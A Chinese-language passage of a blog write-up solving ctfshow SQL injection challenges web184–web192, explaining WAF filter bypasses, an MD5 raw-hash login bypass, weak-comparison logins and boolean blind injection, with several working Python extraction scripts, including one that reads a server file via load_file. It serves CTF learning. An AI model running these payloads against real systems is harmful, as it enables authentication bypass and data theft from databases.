<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)))</span><br></pre></td></tr></table></figure>

<p>这里的话会用a表中符合regexp的pass行去匹配b表，a表所有的数据去掉连接条件的那行就是22行，然后连接条件的那行会和右表的所有内容进行连接，所以最后的结果就是21+22&#x3D;43行</p>
<p>那么我们用regexp去进行匹配</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e09f8d14-24eb-4d77-8dff-7d150969e103.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">f&quot;ctfshow_user as a left join ctfshow_user as b on (substr(a.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span> : payload,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>

<p>这里的话需要注意要排除小数点，因为小数点在regexp的正则里小数点能匹配除 “\n” 之外的任何单个字符</p>
<p>其实这道题还能用group by 结合having去打通配</p>
<p>where也过滤了，用having代替，引号被过滤了，那么字符串部分可以采用16进制绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from ctfshow_user group by pass having pass like 0x63746673686f777b25;</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e09f8d14-24eb-4d77-8dff-7d150969e103.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asc2hex</span>(<span class="params">s</span>):</span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        a1+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    a2 = a1.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> a2</span><br><span class="line"><span class="comment">#将输入的字符转化成十六进制</span></span><br><span class="line"><span class="comment">#通过迭代字符串 s 中的每个字符，用 ord() 获得其 ASCII 值，然后用 hex() 转换为十六进制，并去除前缀 0x，最后拼接成一个连续的字符串。</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass like (&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+asc2hex(temp_flag+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data[&quot;tableName&quot;])</span></span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>因为这里匹配出来的结果只会有一行，所以筛选条件就是$user_count &#x3D; 1</p>
<h3 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这道题多过滤了数字，这时候怎么去构造呢？</p>
<p>这里的话需要用true去构造字符</p>
<p>true&#x3D;1，false&#x3D;0，然后true+true&#x3D;2，用true的自增和相加可以构造字符</p>
<p>例如c的十六进制是0x63，十进制是90</p>
<p><code>0x63 我们可以写成 false，‘x’,true+true+true+true+true+true,true+true+true</code>然后用concat去连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(false,‘x’,(true+true+true+true+true+true),(true+true+true))</span><br></pre></td></tr></table></figure>

<p>但是这里过滤了单引号，得去构造x，还是一样的，用十六进制或者十进制去构造</p>
<p>x 的十进制为120，所以我们添加120个true相加就可以了，但是我们也可以把120拆分为1，2，0，然后构造<em>true、true+true、false</em></p>
<p>所以最后c的构造就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(false,char(concat(true,(true+true),false)),(true+true+true+true+true+true),(true+true+true)</span><br></pre></td></tr></table></figure>

<p>但是发现其实跑不出来，为什么，因为c的十六进制0x63为字符串，mysql只支持十六进制的数字，不支持字符串</p>
<p>所以换成十进制去构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat((power((true+true+true),(true+true))),(power((true+true+true),(true+true))))</span><br></pre></td></tr></table></figure>

<p>所以我们构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by pass having pass regexp(concat(char(concat((power((true+true+true),(true+true))),(power((true+true+true),(true+true))))),char(concat(true,true,(true+true+true+true+true+true))),char(concat(true,false,(true+true)))))</span><br></pre></td></tr></table></figure>

<p>解释后的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by pass having pass regexp(ctf)</span><br></pre></td></tr></table></figure>

<p>结果返回</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504125105121.png" alt="image-20250504125105121"></p>
<p>意味着匹配成功了，我们直接写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e583b83c-af4c-444c-8de2-acd5f5af2b6d.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">strlist = <span class="string">&#x27;&#123;0123456789-abcdefghijklmnopqrstuvwxyz_&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">strdict = &#123;<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;false,&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;true,&#x27;</span>,<span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;(true+true),&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;(true+true+true),&#x27;</span>,<span class="string">&#x27;4&#x27;</span>:<span class="string">&#x27;(true+true+true+true),&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;5&#x27;</span>:<span class="string">&#x27;(true+true+true+true+true),&#x27;</span>,<span class="string">&#x27;6&#x27;</span>:<span class="string">&#x27;(true+true+true+true+true+true),&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;7&#x27;</span>:<span class="string">&#x27;(power((true+true),(true+true+true))-true),&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;8&#x27;</span>:<span class="string">&#x27;(power((true+true),(true+true+true))),&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;9&#x27;</span>:<span class="string">&#x27;(power((true+true),(true+true+true))+true),&#x27;</span></span><br><span class="line">           &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">        m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">ord</span>(j)):</span><br><span class="line">            m += strdict[x]</span><br><span class="line">        m = <span class="string">&#x27;char(concat(&#x27;</span>+m[:-<span class="number">1</span>]+<span class="string">&#x27;)),&#x27;</span><span class="comment">#去除末尾的分号</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&#x27;ctfshow_user group by pass having pass regexp(concat(<span class="subst">&#123;flagstr+m[:-<span class="number">1</span>]&#125;</span>))&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span> : payload,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;---------------匹配成功---------------&#x27;</span>)</span><br><span class="line">            flag += j</span><br><span class="line">            flagstr += m</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>我的脚本相对来说更复杂一点，包师傅的脚本就相对来说要简单很多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStrNum</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&#x27;chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(c[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&#x27;,chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:</span><br><span class="line">        poc = payload.<span class="built_in">format</span>(createStrNum(target + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        <span class="comment"># print(poc)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: poc</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了百分号，大小于号和<code>^</code>字符，但是不影响我们的payload</p>
<h3 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h3><p>#sql的md5</p>
<p>需要传username为admin，然后password的话会md5加密，这里的话用md5去碰撞就行</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504132900480.png" alt="image-20250504132900480"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/ffifdyop</span><br></pre></td></tr></table></figure>

<p>flag在响应里</p>
<h3 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h3><p>#sql弱比较</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504133225788.png" alt="image-20250504133225788"></p>
<p>username&#x3D;0 password&#x3D;0</p>
<p>在官方手册中，如果在比较操作中涉及到字符串和数字，SQL 会尝试将字符串转换为数字，那么只要字符串不是以数字开头，比较时都会转为数字 0 。</p>
<p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如0&#x3D;&#x3D;0a，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p>
<p>然后再来看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p>
<h3 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h3><p>flag在api&#x2F;index.php文件中</p>
<p>去读取那个index.php文件，且注入点在username</p>
<p>username&#x3D;0、password&#x3D;0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username&#x3D;1、password&#x3D;0时，返回“查询失败”。（说明用户不存在）</p>
<p>回显不一样的话打盲注就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;,1,0)</span><br></pre></td></tr></table></figure>

<p>利用0和1的不同回显去打盲注，写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ca1b1a1d-3cf1-4efa-9a37-8ca521e4d226.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">500</span>):<span class="comment">#这是flag在文件中的起始位置</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        x = <span class="built_in">chr</span>(j)</span><br><span class="line">        payload = <span class="string">f&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;x&#125;</span>&#x27;,1,0)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;8d25&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;----------<span class="subst">&#123;x&#125;</span> is right----------&quot;</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h3><p>字符型的盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin/0 密码错误</span><br><span class="line">1/0 用户名不存在</span><br><span class="line"></span><br><span class="line">admin&#x27; and 1#/0密码错误</span><br><span class="line">admin&#x27; and 0#/0用户名不存在</span><br></pre></td></tr></table></figure>

<p>直接写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://50b3216b-0be6-449d-9f3a-0ce96856ca85.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i +<span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(ascii(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        test += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(test)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>

<h3 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h3><p>禁用了ascii，可以用ord绕过，这里数据库都没变</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d4303d22-ec75-4911-8e63-4c300d980ac6.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(ord(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h3><p>过滤掉了，但是也可以不用转码函数去做</p>
